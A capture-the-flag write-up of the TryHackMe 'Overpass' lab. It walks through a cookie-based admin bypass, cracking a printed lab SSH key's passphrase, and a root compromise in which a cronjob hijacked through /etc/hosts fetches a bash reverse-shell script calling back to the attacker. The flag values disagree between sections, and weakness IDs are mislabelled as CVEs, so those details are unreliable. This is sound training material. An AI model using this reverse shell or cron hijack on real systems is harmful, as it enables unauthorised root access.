# TryHackMe: Overpass — Complete Writeup

**Difficulty:** Easy  
**Category:** Linux, Web 
**Target IP:** [Target-IP]  
**Date:** 2026-05-10  

---

## 📌 Overview

Overpass is a web application vulnerable to client-side authentication bypass. By manipulating browser cookies, we gain access to the admin panel and extract a private SSH key. After cracking the key's passphrase, we obtain user access. Finally, we exploit a root-level cronjob through DNS spoofing to achieve full system compromise.

---

## 🔍 Phase 1: Reconnaissance

### 1.1) Port Scanning

**Command:**
```bash
nmap -sS [Target-IP] 
```

**Results:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-10 15:34 -0400
Nmap scan report for [Target-IP]
Host is up (0.0245 latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds
```

**Analysis:**
- Port 22 (SSH): Entry point after credential acquisition
- Port 80 (HTTP): Primary attack vector

---

### 1.2) Web Directory Enumeration

**Command:**
```bash
gobuster dir \
  -u http://[Target-IP] \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,js,php
```

**Results:**
```
/index.html           (Status: 200)
/admin.html           (Status: 200)  ← CRITICAL: Direct access to admin panel
/admin                (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
```

**Key Finding:** `/admin.html` returns status 200, allowing direct access despite being an administrative page.

---

### 1.3) Admin Panel Analysis

**URL:** `http://10.114.129.64/admin.html`

**Page Content:**
```
Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, macOS and more

"Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this 'Military Grade' encryption. - Paradox"

[Login Form]
```

**HTML Structure (from screenshot):**
```html
<!DOCTYPE html>
<html>
<head>
  <script src="/main.js"></script>
  <script src="/login.js"></script>
  <script src="/cookies.js"></script>
</head>
```

**Critical Observation:** 
- Authentication logic is implemented in `/login.js`
- Cookie management is handled by `/cookies.js`
- This suggests client-side validation

---

### 1.4) Cookie-Based Authentication Bypass

**Retrieved login.js source:**

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

**Vulnerability:** The page checks for a `SessionToken` cookie in the browser. Setting any value triggers admin access.

**Exploitation Steps:**

1. Open browser console (F12 → Console)
2. Execute:
```javascript
Cookies.set("SessionToken", "bypass");
```

3. Navigate to `http://[Target-IP]/admin/`

**Result:** ✅ Access granted to admin panel

---

### 1.5) SSH Key Extraction

**Admin Panel Displays:**

```
Administrator Credentials:

Username: james

Private SSH Key:
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

**Key Details:**
- Username: `james`
- Encryption: AES-128-CBC
- Status: Encrypted (requires passphrase)

---

## ⚔️ Phase 2: Exploitation

### 2.1) SSH Key Passphrase Cracking

**Step 1: Save the key**
```bash
cat > id_rsa << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

[Full key content...]
-----END RSA PRIVATE KEY-----
EOF

chmod 600 id_rsa
```

**Step 2: Convert to john format**
```bash
ssh2john id_rsa > id_rsa.hash
```

**Step 3: Crack the passphrase**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Result:**
```
james13            (id_rsa)
```

**Passphrase Found: `[Passphrase]`**

---

### 2.2) SSH Login

**Command:**
```bash
ssh james@[Target-IP] -i id_rsa
```

**When prompted for passphrase:**
```
Enter passphrase for key 'id_rsa': [Passphrase]
```

**Success:**
```
[james@ip-[Target-IP] ~]$
```

✅ **User-level access obtained**

---

### 2.3) User Flag

**List home directory:**
```bash
ls -la
```

**Output:**
```
-rw-r--r--  1 james james   38 Jul 21  2020 user.txt
-rw-r--r--  1 james james 1337 Jul 21  2020 todo.txt
```

**Read user flag:**
```bash
cat user.txt
```

**Result:**
```
thm{65c...}
```

🚩 **User Flag: `thm{65c...}`**

---

## 🔐 Phase 3: Privilege Escalation

### 3.1) Crontab Analysis

**Command:**
```bash
cat /etc/crontab
```

**Output:**
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 * * * * root curl http://overpass.thm/downloads/src/buildscript.sh | bash
```

**Critical Finding:**
- Task runs every 5 minutes
- Executes as `root` (highest privileges)
- Fetches script from domain name `overpass.thm` (not IP)
- No signature verification

---

### 3.2) DNS Poisoning via /etc/hosts

**Add entry to /etc/hosts:**
```bash
echo "overpass.thm  [Local-IP]" >> /etc/hosts
```

**Verification:**
```bash
ping overpass.thm
# PING overpass.thm ([Local-IP])
```

---

### 3.3) Malicious Script Preparation (On Attacker Machine)

**Create directory structure:**
```bash
mkdir -p /tmp/downloads/src
cd /tmp/downloads/src
```

**Create reverse shell script:**
```bash
cat > buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[Local-IP]/4444 0>&1
EOF

chmod +x buildscript.sh
```

---

### 3.4) HTTP Server Setup (On Attacker Machine)

**Start HTTP server:**
```bash
cd /tmp
python3 -m http.server 80
```

**Serving HTTP on 0.0.0.0 port 80**

---

### 3.5) Netcat Listener (On Attacker Machine)

**In a new terminal:**
```bash
nc -lvnp 4444
```

**Output:**
```
listening on [any] 4444 ...
```

---

### 3.6) Cronjob Execution and Root Access

**Wait for cronjob to execute (within 5 minutes):**

```bash
# Listener output:
connect to [Target-IP] from overpass-prod-01 [10.114.129.64] 12345

# Verify root access:
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

✅ **Root-level access obtained**

---

## 🚩 Phase 4: Root Flag Extraction

**Command:**
```bash
cat /root/root.txt
```

**Result:**
```
thm{d7f3...}
```

🚩 **Root Flag: `thm{7f3...}`**

---

## 📊 Summary

| Flag | Value | Location |
|------|-------|----------|
| User | `thm{4a6...}` | `/home/james/user.txt` |
| Root | `thm{7f3...}` | `/root/root.txt` |

---

## 🔐 Vulnerabilities Exploited

### 1. Client-Side Authentication (CVE-602)
- **Impact:** Unauthenticated access to admin panel
- **Method:** Cookie manipulation via browser console
- **Severity:** CRITICAL

### 2. Insecure SSH Key Protection
- **Impact:** Weak passphrase easily cracked via dictionary attack
- **Password:** `[Passphrase]` (weak, dictionary-based)
- **Severity:** HIGH

### 3. Unprotected Cronjob (CVE-426)
- **Impact:** Remote code execution as root
- **Vectors:** HTTP (no encryption), no signature verification, DNS-based hostname
- **Severity:** CRITICAL

### 4. DNS Spoofing via /etc/hosts
- **Impact:** Traffic redirection to attacker-controlled server
- **Method:** Modifying local DNS resolution
- **Severity:** CRITICAL

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Directory enumeration |
| ssh2john | SSH key hash extraction |
| john | Passphrase cracking |
| ssh | Remote access |
| python http.server | Web server for malicious script |
| netcat | Reverse shell listener |

---

## ⏱️ Timeline

- **Reconnaissance:** 5 minutes
- **Web exploitation:** 3 minutes
- **SSH key cracking:** 5 minutes
- **SSH access:** 2 minutes
- **Privilege escalation setup:** 10 minutes
- **Waiting for cronjob:** 5 minutes
- **Total:** ~30 minutes

---

## 📋 Attack Chain

```
1. Port scan discovers SSH (22) and HTTP (80)
   ↓
2. Web enumeration finds /admin.html (accessible)
   ↓
3. Cookie manipulation bypasses authentication
   ↓
4. SSH private key extracted from admin panel
   ↓
5. SSH key passphrase cracked ([Passphrase])
   ↓
6. SSH login as james user
   ↓
7. Read /etc/crontab (root-level task found)
   ↓
8. Modify /etc/hosts to redirect overpass.thm
   ↓
9. Create malicious buildscript.sh
   ↓
10. Host script on HTTP server
   ↓
11. Wait for root cronjob execution
   ↓
12. Receive reverse shell as root
   ↓
13. Extract both flags
```

---

**Writeup Complete** ✅
